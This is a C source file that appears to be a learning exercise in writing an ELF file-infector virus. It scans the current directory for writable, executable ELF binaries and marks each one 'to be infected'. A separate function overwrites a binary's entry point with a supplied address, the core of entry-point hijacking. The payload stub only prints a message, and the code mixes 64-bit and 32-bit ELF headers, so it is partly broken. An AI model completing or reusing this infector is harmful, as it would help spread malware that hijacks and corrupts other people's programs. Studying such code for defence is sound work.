#define _XOPEN_SOURCE 500
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <ftw.h>
#include <string.h>
#include <stdlib.h>
#include <elf.h>
#include <fcntl.h>

#define ROOT_DIR   (".")
#define SPARE_FDS  (4)
#define MAX_FDS    (512)

const unsigned char magic[] = {ELFMAG0, ELFMAG1, ELFMAG2, ELFMAG3};

void infect(const char* fpath){
    printf("%s will be infected.\n", fpath);
}

int can_execute(const struct stat *sb, const char* fpath){
    return (sb->st_uid == getuid() && sb->st_mode & S_IXUSR)
        || (sb->st_mode & S_IXOTH);
}

int can_write(const struct stat *sb, const char* fpath){
    return (sb->st_uid == getuid() && sb->st_mode & S_IWUSR)
        || (sb->st_mode & S_IWOTH);
}

int is_elf(const char* fpath){
    Elf64_Ehdr header; // Assuming 64-bit ELF file.
    size_t nb;
    int ret = 0;
    FILE* f;

    f = fopen(fpath, "rb");
    if (!f) return 0;

    nb = fread(&header, 1, sizeof(header), f);
    if (nb == sizeof(header)) {
        if (memcmp(header.e_ident, magic, sizeof(magic)) == 0) {
            ret = 1;
        }
    }
    fclose(f);
    return ret;
}

int activate(){
    return 1; // 
}


void change_entrypoint(const char* fpath, char *newaddr){
	int fd;
	Elf32_Ehdr ehdr;

	fd = open(fpath, O_RDWR); // read and write
	if (fd < 0) exit(1); // open 실패
	if (read(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) exit(1); // read 실패

	printf("Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
	
	ehdr.e_entry = strtol(newaddr, NULL, 16); // change ehdr struct
	lseek(fd, 0, SEEK_SET);
	if (write(fd, &ehdr, sizeof(ehdr)) != sizeof(ehdr)) exit(1); //write 실패

	printf("Entry point (%s): 0x%x\n", fpath, ehdr.e_entry);
	exit(0);
}


int file_process(const char *fpath, const struct stat *sb, int flag, struct FTW *s){
    int ret = 0;
    if (flag == FTW_F && can_execute(sb, fpath) && can_write(sb, fpath) && is_elf(fpath) && activate()) 
        infect(fpath);
    return ret;
}

int main(int argc, char* argv[])
{
    struct timeval t;
    int nfds = getdtablesize() - SPARE_FDS;
    nfds = nfds > MAX_FDS ? MAX_FDS : nfds;

    gettimeofday(&t, NULL);
    srand(t.tv_usec * t.tv_sec);
    nftw(ROOT_DIR, file_process, nfds, FTW_PHYS);
    exit(0);
}



